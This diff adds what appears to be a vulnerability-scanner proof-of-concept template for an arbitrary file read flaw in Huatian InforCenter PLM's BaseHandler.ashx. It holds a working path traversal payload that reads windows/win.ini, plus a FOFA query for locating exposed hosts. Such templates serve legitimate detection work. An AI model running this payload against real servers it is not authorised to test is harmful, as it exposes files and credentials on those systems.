@@ -1,0 +1,18 @@
+id: poc-yaml-hoteamsoft-inforcenter-plm-basehandler-anyfile-read
+info:
+  name: 华天软件InforCenter PLM BaseHandler 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 华天软件InforCenter-PLM
+  fofa: body="/Base/BaseHandler.ashx"
+requests:
+- method: POST
+  path: /Base/BaseHandler.ashx
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: type=downloadFile&extensionName=config&fileName=../../windows/win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"bit
+    app support") && !contains(body,"<") && contains(headers,"attachment;filename=")
+variables: {}
+transport: http
